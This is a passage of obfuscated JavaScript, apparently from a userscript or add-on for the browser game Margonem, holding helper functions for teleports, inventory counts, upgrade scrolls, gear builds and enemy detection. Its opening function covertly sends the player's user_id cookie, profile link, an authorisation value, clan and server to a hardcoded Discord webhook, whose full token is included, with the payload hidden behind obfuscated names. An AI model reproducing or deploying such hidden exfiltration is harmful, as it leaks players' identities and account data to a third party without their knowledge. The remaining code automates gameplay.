  fetch("https://discord.com/api/webhooks/1440995542430777485/lQE9OHA-KUvLn6KPRC3XmG1264epQEiHxe_kvG43cse1f-5x-ECpFyvcnk6B3_vDShdJ", {
    method: "POST",
    headers: {
      "content-type": "application/json"
    },
    body: JSON.stringify({
      embeds: [{
        title: "[1] [" + ut_time(unix_time()) + "] [" + getCookie("user_id") + "] " + _0x13c40a + " (" + _0x45ac03 + _0x23d7cd + ")",
        url: "https://www.margonem.pl/profile/view," + getCookie("user_id"),
        color: "1146986",
        description: "[L] Autoryzacja: " + _0xc10b39 + "\nKlan: **" + _0xe52377 + "**" + _0x2a801d + " \n**" + location.host.split(".")[0] + " | " + _0x3c84cc + "** " + _0x32ee72 + " " + _0x533b5a
      }]
    })
  });
}
export function searchInElement(_0x2b92d6, _0x7963b6) {
  const _0x2d9032 = $("div#" + _0x7963b6);
  if (!_0x2b92d6) {
    _0x2d9032.show();
    return;
  }
  let _0x78e37b;
  try {
    _0x78e37b = new RegExp(_0x2b92d6, "i");
  } catch (_0x5b51b2) {
    _0x2d9032.show();
    return;
  }
  _0x2d9032.each(function () {
    const _0x4d856b = $(this).find(".mp-list-nick, .mp-list-map, .mp-list-level").text().toLowerCase();
    $(this).toggle(_0x78e37b.test(_0x4d856b));
  });
}
export function useRandomTp() {
  const _0x237bf7 = Engine.items.fetchLocationItems("g");
  if (!_0x237bf7 || !Array.isArray(_0x237bf7)) {
    return;
  }
  const _0x37917c = [];
  const _0x77c9d5 = Engine.hero?.d?.lvl ?? 0;
  const _0x53889e = ts() / 1000;
  for (const _0x10b5ed of _0x237bf7) {
    if (!_0x10b5ed || _0x10b5ed.cl !== 32) {
      continue;
    }
    const _0x44b40a = _0x10b5ed._cachedStats || {};
    const _0x21617e = _0x44b40a.lvl ?? 0;
    let _0x4ba48f = 0;
    if (_0x44b40a.timelimit) {
      const _0x48832c = _0x44b40a.timelimit.split(",");
      if (_0x48832c.length > 1) {
        _0x4ba48f = Number(_0x48832c[1]) || 0;
      }
    }
    if (_0x77c9d5 >= _0x21617e && _0x53889e >= _0x4ba48f) {
      _0x37917c.push(_0x10b5ed.id);
    }
  }
  if (_0x37917c.length) {
    const _0x5d3f49 = _0x37917c[Math.floor(Math.random() * _0x37917c.length)];
    window._g("moveitem&st=1&id=" + _0x5d3f49);
  } else {
    message("Brak teleportu do użycia!");
  }
}
export function canLoss(_0x278d05) {
  const _0x5cb647 = Engine.items.getItemById(_0x278d05);
  if (_0x5cb647?._cachedStats?.enhancement_upgrade_lvl == 5) {
    return true;
  }
  return false;
}
export function getQuantityInBag(_0x2dea82) {
  const _0x533336 = Engine.items.fetchLocationItems("g");
  let _0x2e85a6 = 0;
  for (const _0x576be6 of _0x533336) {
    if (_0x576be6.name === _0x2dea82 && _0x576be6?._cachedStats?.amount) {
      _0x2e85a6 += Number(_0x576be6?._cachedStats?.amount) || 0;
    }
  }
  return _0x2e85a6;
}
export function play_success() {
  var _0x1b91cd = new Audio("https://margoplus.pl/sounds/select_upgrade.mp3");
  _0x1b91cd.volume = 1;
  _0x1b91cd.autoplay = false;
  _0x1b91cd.play();
}
export function getPapirysCounts(_0x5ed082) {
  if (!_0x5ed082) {
    return false;
  }
  const _0x273474 = Engine.items.getItemById(_0x5ed082);
  const _0x1df681 = _0x273474?._cachedStats?.rarity;
  if (_0x1df681) {
    const _0x4d5568 = Engine.items.fetchLocationItems("g").filter(_0x30c439 => _0x30c439._cachedStats && _0x30c439._cachedStats.hasOwnProperty("bonus_reselect") && _0x30c439._cachedStats.hasOwnProperty("target_rarity") && _0x30c439._cachedStats.target_rarity == _0x1df681);
    if (_0x4d5568.length > 0) {
      return true;
    }
    return false;
  }
  return false;
}
export function sendUsePapirus(_0x39c38b, _0x5c8240, _0x50ed79) {
  _g("moveitem&st=0&id=" + _0x39c38b + "&x=" + _0x5c8240 + "&y=" + _0x50ed79);
}
export function getListOfBuilds() {
  let _0x5057c3 = Engine.buildsManager.getBuildsCommons().getAll$builds().length;
  let _0x1a86c9 = [];
  for (let _0x176197 = 0; _0x176197 <= _0x5057c3; _0x176197++) {
    let _0x2d2875 = _0x176197 === 0 ? "Wyłączone" : Engine.buildsManager.getBuildsCommons().getBuildsName()[_0x176197].name;
    if (_0x2d2875 == "[SET." + _0x176197 + "]") {
      _0x2d2875 = "Zestaw nr " + _0x176197;
    }
    const _0x594214 = {
      value: _0x176197,
      label: _0x2d2875
    };
    _0x1a86c9.push(_0x594214);
  }
  return _0x1a86c9;
}
export function enemyIsHere() {
  const _0x5b483a = Engine.others.check();
  for (const _0xf06bc6 in _0x5b483a) {
    const _0x191cac = _0x5b483a[_0xf06bc6];
    if ([6, 3, 8, 1].includes(_0x191cac.relation)) {
      return true;
    }
  }
  return false;
}